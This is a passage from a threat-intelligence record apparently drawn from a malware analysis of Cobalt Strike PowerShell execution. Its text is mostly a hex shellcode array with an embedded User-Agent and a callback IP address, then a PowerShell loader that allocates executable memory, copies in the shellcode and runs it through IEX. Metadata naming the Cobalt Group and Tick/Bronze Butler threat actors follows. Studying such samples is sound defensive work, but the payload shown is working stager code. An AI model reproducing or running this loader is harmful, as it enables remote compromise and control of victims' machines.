0xbb, 0x1, 0x0, 0x0,\n0x53, 0x50, 0x68, 0x57, 0x89, 0x9f, 0xc6, 0xff, 0xd5, 0xeb, 0x70, 0x5b, 0x31, 0xd2,\n0x52, 0x68, 0x0, 0x2, 0x40, 0x84, 0x52, 0x52, 0x52, 0x53, 0x52, 0x50, 0x68, 0xeb,\n0x55, 0x2e, 0x3b, 0xff, 0xd5, 0x89, 0xc6, 0x83, 0xc3, 0x50, 0x31, 0xff, 0x57, 0x57,\n\n```\n\n-----\n\n```\n0x6a, 0xff, 0x53, 0x56, 0x68, 0x2d, 0x6, 0x18, 0x7b, 0xff, 0xd5, 0x85, 0xc0, 0xf,\n0x84, 0xc3, 0x1, 0x0, 0x0, 0x31, 0xff, 0x85, 0xf6, 0x74, 0x4, 0x89, 0xf9, 0xeb, 0x9,\n0x68, 0xaa, 0xc5, 0xe2, 0x5d, 0xff, 0xd5, 0x89, 0xc1, 0x68, 0x45, 0x21, 0x5e, 0x31,\n0xff, 0xd5, 0x31, 0xff, 0x57, 0x6a, 0x7, 0x51, 0x56, 0x50, 0x68, 0xb7, 0x57, 0xe0,\n0xb, 0xff, 0xd5, 0xbf, 0x0, 0x2f, 0x0, 0x0, 0x39, 0xc7, 0x74, 0xb7, 0x31, 0xff, 0xe9,\n0x91, 0x1, 0x0, 0x0, 0xe9, 0xc9, 0x1, 0x0, 0x0, 0xe8, 0x8b, 0xff, 0xff, 0xff, 0x2f,\n0x49, 0x47, 0x7a, 0x52, 0x0, 0x35, 0xea, 0xc1, 0x38, 0x3b, 0x2e, 0x33, 0x80, 0x32,\n0x3e, 0x60, 0x48, 0x90, 0x8d, 0x3b, 0xa8, 0x4a, 0x41, 0x41, 0x62, 0x31, 0x3f, 0x12,\n0xda, 0x8d, 0x5f, 0x43, 0xce, 0xa2, 0x30, 0xea, 0x90, 0x6, 0x5, 0x82, 0xf9, 0xf3,\n0xa0, 0x84, 0xe, 0x83, 0x8e, 0xe6, 0xba, 0x72, 0x47, 0xd9, 0x23, 0x96, 0x1e, 0x43,\n0xf6, 0x9a, 0x76, 0x5b, 0x10, 0x8b, 0xfb, 0x8e, 0xe, 0xdd, 0x5c, 0x38, 0x6e, 0x49,\n0x7b, 0xf0, 0xcd, 0xe5, 0x73, 0xf9, 0x5d, 0xe9, 0x0, 0x55, 0x73, 0x65, 0x72, 0x2d,\n0x41, 0x67, 0x65, 0x6e, 0x74, 0x3a, 0x20, 0x4d, 0x6f, 0x7a, 0x69, 0x6c, 0x6c, 0x61,\n0x2f, 0x35, 0x2e, 0x30, 0x20, 0x28, 0x63, 0x6f, 0x6d, 0x70, 0x61, 0x74, 0x69, 0x62,\n0x6c, 0x65, 0x3b, 0x20, 0x4d, 0x53, 0x49, 0x45, 0x20, 0x39, 0x2e, 0x30, 0x3b, 0x20,\n0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73, 0x20, 0x4e, 0x54, 0x20, 0x36, 0x2e, 0x31,\n0x3b, 0x20, 0x54, 0x72, 0x69, 0x64, 0x65, 0x6e, 0x74, 0x2f, 0x35, 0x2e, 0x30, 0x3b,\n0x20, 0x46, 0x75, 0x6e, 0x57, 0x65, 0x62, 0x50, 0x72, 0x6f, 0x64, 0x75, 0x63, 0x74,\n0x73, 0x3b, 0x20, 0x49, 0x45, 0x30, 0x30, 0x30, 0x36, 0x5f, 0x76, 0x65, 0x72, 0x31,\n0x3b, 0x45, 0x4e, 0x5f, 0x47, 0x42, 0x29, 0xd, 0xa, 0x0, 0x33, 0x4c, 0x35, 0x6c,\n0x6a, 0x72, 0x64, 0xf3, 0x8f, 0xb1, 0x2f, 0xae, 0x8c, 0x47, 0x1b, 0x7b, 0x1c, 0x66,\n0xd1, 0x8c, 0x98, 0xc0, 0xd6, 0x2d, 0xe5, 0xda, 0x46, 0x72, 0x15, 0xc9, 0x3d, 0x21,\n0xda, 0xf7, 0x7e, 0x8f, 0x14, 0x0, 0xe0, 0x62, 0xca, 0x3, 0xfb, 0x5e, 0xbe, 0x3,\n0x61, 0x59, 0xaf, 0x78, 0xd4, 0xbb, 0xcb, 0xda, 0xc0, 0x22, 0x43, 0x8d, 0x86, 0xd4,\n0x57, 0x21, 0xc2, 0x7e, 0x5d, 0x9, 0xb6, 0x62, 0x3b, 0x2a, 0x4e, 0xe, 0x32, 0xe9,\n0x6e, 0x6a, 0xd3, 0xb6, 0x38, 0x99, 0x2, 0xc8, 0x2c, 0x89, 0x55, 0xa1, 0xa3, 0xcd,\n0x7b, 0x64, 0x6d, 0xb9, 0x1f, 0xce, 0x77, 0x2a, 0x7e, 0x56, 0x5d, 0x70, 0xbc, 0xd0,\n0x6f, 0x91, 0x4a, 0xc6, 0xe3, 0x15, 0x24, 0x7f, 0x65, 0x7a, 0xea, 0x5d, 0xad, 0x55,\n0x6d, 0x69, 0xc2, 0x10, 0x35, 0x81, 0x87, 0xb5, 0x49, 0x17, 0x60, 0xcc, 0xf6, 0xcd,\n0x29, 0x5f, 0x9a, 0x33, 0xce, 0x98, 0x7c, 0xbb, 0x7f, 0xad, 0xaa, 0xbb, 0xf7, 0x46,\n0x66, 0xe6, 0xf, 0x4d, 0x21, 0xc2, 0x2a, 0xfc, 0x52, 0x43, 0xd7, 0xf2, 0x7c, 0xcb,\n0xc6, 0x26, 0xc2, 0xd7, 0x61, 0x86, 0x3, 0xad, 0x48, 0xa4, 0x32, 0x87, 0xb4, 0x19,\n0xb5, 0x1f, 0x28, 0x7a, 0xc5, 0x7e, 0x8d, 0x7b, 0xa5, 0x9a, 0xa, 0xc7, 0x74, 0x52,\n0x78, 0xce, 0x1f, 0x36, 0x0, 0x68, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5, 0x6a, 0x40,\n0x68, 0x0, 0x10, 0x0, 0x0, 0x68, 0x0, 0x0, 0x40, 0x0, 0x57, 0x68, 0x58, 0xa4, 0x53,\n0xe5, 0xff, 0xd5, 0x93, 0xb9, 0x0, 0x0, 0x0, 0x0, 0x1, 0xd9, 0x51, 0x53, 0x89, 0xe7,\n0x57, 0x68, 0x0, 0x20, 0x0, 0x0, 0x53, 0x56, 0x68, 0x12, 0x96, 0x89, 0xe2, 0xff,\n0xd5, 0x85, 0xc0, 0x74, 0xc6, 0x8b, 0x7, 0x1, 0xc3, 0x85, 0xc0, 0x75, 0xe5, 0x58,\n0xc3, 0xe8, 0xa9, 0xfd, 0xff, 0xff, 0x31, 0x39, 0x32, 0x2e, 0x31, 0x36, 0x38, 0x2e,\n0x31, 0x30, 0x30, 0x2e, 0x31, 0x30, 0x33, 0x0, 0x66, 0x6a, 0x58, 0xa9\n$virtualAllocPtr = GetPtrToMethod 'kernel32.dll' 'VirtualAlloc'\n$virtalAllocAssembly = CreateDynamicAssemblyType @([IntPtr], [UInt32], [UInt32],\n[UInt32]) ([IntPtr])\n$virtualAlloc =\n[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($virtualAllocP\n $virtalAllocAssembly)\n$buffer = $virtualAlloc.Invoke([IntPtr]::Zero, $shellcode.Length, 0x3000, 0x40)\n[System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $buffer,\n$shellcode.length)\n$bufferAssembly = (CreateDynamicAssemblyType @([IntPtr]) ([Void]))\n$bufferDelegate =\n[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($buffer,\n\n```\n\n-----\n\n```\n$bufferAssembly)\n$bufferDelegate.Invoke([IntPtr]::Zero)\n'@\nIf ([IntPtr]::size -eq 8) {\n  start-job { param($a) IEX $a } -RunAs32 -Argument $x | wait-job | Receive-Job\n}\nelse {\n  IEX $x\n}\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-12-01 - Cobalt Strike PowerShell Execution.pdf"
    ],
    "report_names": [
        "2020-12-01 - Cobalt Strike PowerShell Execution.pdf"
    ],
    "threat_actors": [
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "f8dddd06-da24-4184-9e24-4c22bdd1cbbf",
            "created_at": "2023-01-06T13:46:38.626906Z",
            "updated_at": "2025-03-27T02:00:02.877001Z",
            "deleted_at": null,
            "main_name": "Tick",
            "aliases": [
                "Stalker Taurus",
                "PLA Unit 61419",
                "Nian",
                "BRONZE BUTLER",
                "REDBALDKNIGHT",
                "STALKER PANDA",
                "G0060"
            ],
            "source_name": "MISPGALAXY:Tick",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "d4e7cd9a-2290-4f89-a645-85b9a46d004b",
            "created_at": "2022-10-25T16:07:23.419513Z",
            "updated_at": "2025-03-27T02:02:09.790389Z",
            "deleted_at": null,
            "main_name": "Bronze Butler",
            "aliases": [
                "Bronze Butler",
                "CTG-2006",
                "Operation ENDTRADE",
                "RedBaldNight",
                "Stalker Panda",
                "Stalker Taurus",
                "TEMP.Tick",
                "Tick"
            ],
            "source_name": "ETDA:Bronze Butler",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "9002 RAT",
                "AngryRebel",
                "Blogspot",
                "Daserf",
                "Datper",
                "Elirks",
                "Farfli",
                "Gh0st RAT",
                "Ghost RAT",
                "HOMEUNIX",
                "HidraQ",
                "HomamDownloader",
                "Homux",
                "Hydraq",
                "Lilith",
                "Lilith RAT",
                "McRAT",
                "MdmBot",
                "Mimikatz",
                "Minzen",
                "Moudour",
                "Muirim",
                "Mydoor",
                "Nioupale",
                "PCRat",
                "POISONPLUG.SHADOW",
                "Roarur",
                "RoyalRoad",
                "ShadowPad Winnti",
                "ShadowWali",
                "ShadowWalker",
                "SymonLoader",
                "WCE",
                "Wali",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "XShellGhost",
                "XXMM",
                "gsecdump",
                "rarstar"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "bf0489c5-1c07-41e6-91c9-855ad96ccc6a",
            "created_at": "2022-10-25T16:47:55.541639Z",
            "updated_at": "2025-03-27T02:05:17.253496Z",
            "deleted_at": null,
            "main_name": "BRONZE BUTLER",
            "aliases": [
                "Daserf",
                "Stalker Panda ",
                "Tick ",
                "CTG-2006 "
            ],
            "source_name": "Secureworks:BRONZE BUTLER",
            "tools": [
                " DGet",
                " Daserf",
                " Datper",
                " Gofarer",
                " MSGet",
                " Mimikatz",
                " RarStar",
                " Screen Capture Tool",
                " ShadowPad",
                " T-SMB",
                " WinRAR",
                " Windows Credential Editor",
                " gsecdump",
                " xmm downloader",
                " xxmm",
                "ABK"
            ],
            "source_id": "Secureworks",
            "reports": null
        }
    ],
    "ts_created_at": 1673536033,
    "ts_updated_at": 1743041761,
    "ts_creation_date": 1653753597,
    "ts_modification_date": 1653753597,
    "files": {
        "pdf": "https://archive.orkl.eu/3a7110302aff8249894e71dab406cb22ecb83342.pdf",
        "text": "https://archive.orkl.eu/3a7110302aff8249894e71dab406cb22ecb83342.txt",
        "img": "https://archive.orkl.eu/3a7110302aff8249894e71dab406cb22ecb83342.jpg"
    }
}